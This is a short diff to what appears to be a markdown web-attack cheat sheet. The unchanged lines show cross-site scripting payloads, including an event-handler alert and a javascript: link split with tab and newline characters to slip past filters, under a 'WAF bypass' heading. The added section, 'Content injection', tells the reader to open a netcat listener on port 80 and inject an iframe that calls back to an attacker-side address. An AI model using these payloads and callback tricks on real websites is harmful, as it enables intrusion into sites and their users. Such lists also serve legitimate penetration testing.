@@ -45,6 +45,14 @@ draggable=true ondragstart="alert(1)
 "><a href=j<TAB><NEWLINE><TAB><NEWLINE><TAB><NEWLINE>avascript:confirm("payload")>XSSs</a>
 ```
 
+### Content injection
+
+In the example below, set up a NetCat listener on port 80 `sudo nc -nlvp 80`. This listener will receive a connection on success.
+
+```plain
+<iframe src=http://10.10.10.10/report height="O" width="O"></iframe>
+```
+
 ### WAF bypass
 
 ```plain
